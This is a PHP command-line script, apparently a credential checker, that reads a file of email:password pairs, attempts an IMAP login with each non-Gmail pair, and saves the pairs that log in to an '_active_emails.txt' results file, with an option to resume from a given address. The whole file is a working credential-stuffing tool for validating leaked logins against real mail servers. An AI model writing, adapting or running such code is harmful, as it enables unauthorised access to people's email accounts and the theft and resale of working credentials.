<?php

require_once "library.php";

$shortopts = "f:m::";
$options = getopt($shortopts);

if (!isset($options["f"])){
	echo "Usage: checker.php -f PATH (required) -m start from mail (optional) \n";
	die();
}

var_Dump($options);

if (file_exists($options["f"])){
	$bn = basename($options["f"], ".txt");
	$handle = fopen($options["f"], "r");
	$result = fopen(__DIR__ . DIRECTORY_SEPARATOR . "results" . 
							  DIRECTORY_SEPARATOR . $bn . "_active_emails.txt", "a");

	if(!isset($options["m"])){
		$flag = TRUE;
	} else {
		$flag = FALSE;
	}

	if ($handle && $result) {
	    while (($line = fgets($handle)) !== false) {
	    	$arr = split(":", $line);
	    	$email = $arr[0];
	    	$password = $arr[1];

	    	if (isset($options["m"]) && !empty($options["m"])){
	    		if ($options["m"] === $email){
	    			$flag = TRUE;
	    		}
	    	}

	    	if($flag){

		    	$domain = split("@", $email)[1];

		    	debug($email);

		    	if ($domain !== "gmail.com"){

			    	if (connectToImap($domain, $email, $password) !== FALSE){

			    		debug("Connected to: " . $email);
			    		fwrite($result, $email . ":" . $password);
			    	}
		    	}
	    	}
	    }
	}

	fclose($handle);
	fclose($result);
}

?>